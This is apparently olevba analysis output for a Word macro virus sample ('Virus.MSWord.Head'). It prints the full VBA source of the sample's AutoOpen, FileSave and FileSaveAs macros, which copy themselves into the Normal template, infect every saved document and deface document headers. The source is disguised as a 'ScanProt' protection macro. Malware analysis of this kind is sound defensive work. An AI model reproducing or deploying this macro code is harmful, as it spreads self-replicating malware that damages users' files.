olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Head-1cf174b5672e7f016fdf2ea12a9e518310681014
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Head-1cf174b5672e7f016fdf2ea12a9e518310681014 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Head-1cf174b5672e7f016fdf2ea12a9e518310681014 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "ScanProt macro to install protection macros, disinfect your Normal (Global) template and run the CleanAll macro."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim f$
Dim Success
f$ = WordBasic.[FileName$]()
WordBasic.MacroCopy f$ + ":AutoOpen", "Global:ao"
WordBasic.MacroCopy f$ + ":fsa", "Global:FileSaveAs"
WordBasic.MacroCopy f$ + ":fs", "Global:FileSave"
WordBasic.EditSelectAll
WordBasic.FormatFont Color:=7
WordBasic.StartOfDocument
Success = WordBasic.ViewHeader()
If Not Success Then WordBasic.ViewHeader
WordBasic.EditSelectAll
WordBasic.Insert "Your document was infected by a very dangerous virus!"
WordBasic.ViewHeader
End Sub
-------------------------------------------------------------------------------
VBA MACRO fsa.bas 
in file: Virus.MSWord.Head-1cf174b5672e7f016fdf2ea12a9e518310681014 - OLE stream: 'Macros/VBA/fsa'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.fsa.MAIN"
Dim f$
On Error GoTo -1: On Error GoTo Abort
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
WordBasic.FileSaveAs dlg
f$ = WordBasic.[FileName$]()
WordBasic.MacroCopy "Global:FileSaveAs", f$ + ":fsa"
WordBasic.MacroCopy "Global:FileSave", f$ + ":fs"
WordBasic.MacroCopy "Global:ao", f$ + ":AutoOpen"
WordBasic.FileSave
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO fs.bas 
in file: Virus.MSWord.Head-1cf174b5672e7f016fdf2ea12a9e518310681014 - OLE stream: 'Macros/VBA/fs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves the active document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.fs.MAIN"
Dim f$
WordBasic.FileSave
f$ = WordBasic.[FileName$]()
WordBasic.FileSaveAs Name:=f$, Format:=1, AddToMru:=0
WordBasic.MacroCopy "Global:FileSaveAs", f$ + ":fsa"
WordBasic.MacroCopy "Global:FileSave", f$ + ":fs"
WordBasic.MacroCopy "Global:ao", f$ + ":AutoOpen"
WordBasic.FileSave
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

